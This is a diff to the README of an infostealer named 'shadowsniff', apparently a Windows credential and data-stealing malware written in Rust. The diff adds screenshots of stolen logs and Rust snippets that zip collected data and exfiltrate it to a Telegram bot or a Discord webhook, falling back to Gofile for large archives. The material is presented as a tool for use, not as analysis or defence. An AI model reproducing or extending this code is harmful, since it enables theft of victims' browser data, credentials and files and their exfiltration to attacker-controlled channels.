@@ -29,7 +29,31 @@ covering all essential data extraction capabilities for Windows targets.
 ### Log Sending
 
 - [x] Discord webhook
+  <table>
+  <tr>
+    <td align="center">
+      <img src="./.github/images/discord_internal.png" width="200"/><br/>
+    <sub>Internal File</sub>
+    </td>
+    <td align="center">
+      <img src="./.github/images/discord_external.png" width="200"/><br/>
+    <sub>External File</sub>
+    </td>
+  </tr>
+  </table>
 - [x] Telegram bot
+  <table>
+  <tr>
+    <td align="center">
+      <img src="./.github/images/telegram_internal.png" width="200"/><br/>
+    <sub>Internal File</sub>
+    </td>
+    <td align="center">
+      <img src="./.github/images/telegram_external.png" width="200"/><br/>
+    <sub>External File</sub>
+    </td>
+  </tr>
+  </table>
 
 ### Browsers
 
@@ -91,7 +115,6 @@ When started, each task runs in its own thread.
 A composite task waits for all its subtasks to finish before it completes.
 
 The stealer **does not use the Rust standard library**.
-
 ```rust
 use filesystem::path::Path;
 use ipinfo::init_ip_info;
@@ -123,13 +146,57 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
     let zip = ZipArchive::default()
         .add_folder_content(&fs, &out)
         .password("shadowsniff-output")
-        .comment(displayed_collector)
-        .create();
-
+        .comment(displayed_collector);
+  
+    
+    // 1. write to the file `output.zip`
+    //
+    let zip = zip.create();
     let out = Path::new("output.zip");
     let _ = StorageFileSystem.write_file(&out, &zip);
     
+    // 2. or upload, like call upload_telegram
+    //
+    // let _ = upload_telegram(env!("BOT_TOKEN"), zip);
+  
     0
+}
+```
+
+Upload to the telegram
+```rust
+use collector::Collector;
+use sender::{LogSenderExt, SendError};
+use zip::ZipArchive;
+use sender::telegram_bot::TelegramBot;
+
+pub fn upload_telegram<C>(chat_id: &str, bot: &str, zip: ZipArchive, collector: &C) -> Result<(), SendError>
+where
+    C: Collector
+{
+    TelegramBot::new(Arc::from(chat_id), Arc::from(bot))
+        .send_archive(zip, collector)
+}
+```
+
+Uploads a log to a Discord webhook, with a fallback to Gofile if the archive exceeds Discord's file size limit.
+```rust
+use collector::Collector;
+use sender::{LogSenderExt, SendError};
+use sender::discord_webhook::DiscordWebhook;
+use sender::gofile::Gofile;
+use sender::size_fallback::SizeFallbackSender;
+use zip::ZipArchive;
+
+pub fn upload_discord<C>(webhook: &str, zip: ZipArchive, collector: &C) -> Result<(), SendError>
+where 
+    C: Collector
+{
+    let discord = DiscordWebhook::new(Arc::from(webhook));
+    let gofile = Gofile::new(discord.clone());
+    
+    SizeFallbackSender::new(discord, gofile)
+        .send_archive(zip, collector)
 }
 ```
 
